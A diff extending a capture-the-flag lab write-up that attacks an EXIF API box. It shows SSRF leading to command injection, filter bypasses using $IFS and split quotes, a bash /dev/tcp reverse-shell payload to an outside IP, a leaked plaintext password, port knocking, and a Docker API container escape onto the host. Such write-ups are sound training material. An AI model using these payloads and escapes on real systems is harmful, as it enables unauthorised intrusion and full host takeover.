@@ -153,5 +153,181 @@ http://10.10.31.233/api/exif?url=http://api-dev-backup:8080/exif?url=/etc/passwd
 
 ![image](https://user-images.githubusercontent.com/5285547/129357665-816ce4b1-a7d1-4643-b421-e7b0f8e34579.png)
 
+I quickly worked out we can use command injection here to get some results. 
 
+![image](https://user-images.githubusercontent.com/5285547/129362430-5d0d77ba-cc82-45ea-a095-575c51d92182.png)
+
+```
+http://10.10.183.57/api/exif?url=http://api-dev-backup:8080/exif?url=;ls -la
+```
+
+I was still blocked on the banned words. So tried a few tricks from here: https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions
+
+Then I was able to bypass the bad word filter with a simple ''
+
+![image](https://user-images.githubusercontent.com/5285547/129362626-cea87889-6899-4ea1-bfc1-22b9e7c40928.png)
+
+Using this technique I started to enum the system before I attempted to get a reverse shell. 
+
+Bypass chars
+
+```
+$IFS   # Spaces
+''     # Break a word up
+
+Eg:
+exif?url=;cat$IFS/etc/pas''swd
+exif?url=;cat${IFS}/etc/pas''swd
+```
+
+Further testing and results.
+
+```
+Sent: http://10.10.183.57/api/exif?url=http://api-dev-backup:8080/exif?url=;id
+Response: uid=0(root) gid=0(root) groups=0(root)
+
+Sent: http://10.10.183.57/api/exif?url=http://api-dev-backup:8080/exif?url=;hostname
+Response: api-dev-backup
+```
+
+## User 
+
+Doing some more enum on the main url showed some intreseting results. 
+
+```
+dirb http://10.10.16.111/ /usr/share/seclists/Discovery/Web-Content/common.txt
+```
+
+![image](https://user-images.githubusercontent.com/5285547/129380556-5030cba7-9070-4da2-b4e7-273eff237acd.png)
+
+Curling the request and we get the flag for user. 
+
+![image](https://user-images.githubusercontent.com/5285547/129382555-f91a0ffa-e9b1-4c3b-b980-b99eea1f1f00.png)
+
+
+## Root (Docker Container)
+
+Time to get on the box to make enumeration easier. 
+
+```
+Sent: 
+Response: 
+```
+
+With this in mind I started to craft a payload that would work to bypass the word filter. 
+
+```
+a="ba";b="sh";echo "$a$b -c '$a$b -i >& /dev/tcp/10.8.153.120/9999 0>&1'" 
+```
+
+This also failed. Looking again I worked out the its best to close the first command being sent.  
+So Curl is the first command to run.   
+So null that command with '';   
+Now enter any other command. 
+
+```
+'';/bin/ba''sh -c "id"
+http://10.10.3.112/api/exif?url=http://api-dev-backup:8080/exif?url='';id
+
+ Retrieved Content
+               ----------------------------------------
+               uid=0(root) gid=0(root) groups=0(root)
+```
+
+After many attempts to get a reverse shell I quickly realised it was not going to happen. I then started manual enumeration. 
+
+Knowing we were aready root. I started there. 
+
+![image](https://user-images.githubusercontent.com/5285547/129371290-c23accba-0755-40a1-9d63-efc5ae5232fd.png)
+
+dev-note.txt
+
+```
+Hey guys,
+
+Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.
+
+Anyways, the password is fluffybunnies123
+
+Cheers,
+
+Hydra
+```
+
+Also we note a git repo here too. Lets start to enumerate that too. 
+
+```
+http://10.10.3.112/api/exif?url=http://api-dev-backup:8080/exif?url='';cd /root; git log
+```
+
+![image](https://user-images.githubusercontent.com/5285547/129371931-2e4be35d-1a53-4439-9a06-2208f518d81a.png)
+
+Lets see the changes on the commit ids. 
+
+```
+http://10.10.3.112/api/exif?url=http://api-dev-backup:8080/exif?url='';cd /root; git show 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
+```
+
+Aweomse! we get the flag and a hint to open a port for docker tcp. 
+
+![image](https://user-images.githubusercontent.com/5285547/129372213-dac5d8cc-3acc-4c38-9584-4395fc38ef56.png)
+---
+## Port Knocking (root flag)
+
+Ports to knock. 
+
+```
+knock 10.10.3.112 42 1337 10420 6969 63000
+```
+
+Before
+
+```
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+```
+
+After
+
+```
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2375/tcp open  docker
+```
+
+Now we have a new port open, time to connect and see whats on it. 
+
+Using the info here: https://book.hacktricks.xyz/pentesting/2375-pentesting-docker  
+It was easy to enum the target. 
+
+```
+curl -s http://10.10.3.112:2375/version | jq
+#or
+docker -H 10.10.3.112:2375 version
+```
+
+```
+docker -H 10.10.3.112:2375 images
+
+REPOSITORY                                    TAG       IMAGE ID       CREATED         SIZE
+exif-api-dev                                  latest    4084cb55e1c7   7 months ago    214MB
+exif-api                                      latest    923c5821b907   7 months ago    163MB
+frontend                                      latest    577f9da1362e   7 months ago    138MB
+endlessh                                      latest    7bde5182dc5e   7 months ago    5.67MB
+nginx                                         latest    ae2feff98a0c   8 months ago    133MB
+debian                                        10-slim   4a9cd57610d6   8 months ago    69.2MB
+registry.access.redhat.com/ubi8/ubi-minimal   8.3       7331d26c1fdf   8 months ago    103MB
+alpine                                        3.9       78a2ce922f86   15 months ago   5.55MB
+```
+
+After trying a few containers, I found one that let me login and had the filesystem for the host on. 
+
+```
+docker -H 10.10.3.112:2375 run --rm -it -v /:/host/ nginx chroot /host/ bash
+```
+![image](https://user-images.githubusercontent.com/5285547/129374037-4be36896-77f9-4c71-a7e3-eb38e24feb9b.png)
+
+Now we can get the real root flag and complete the box. 
 
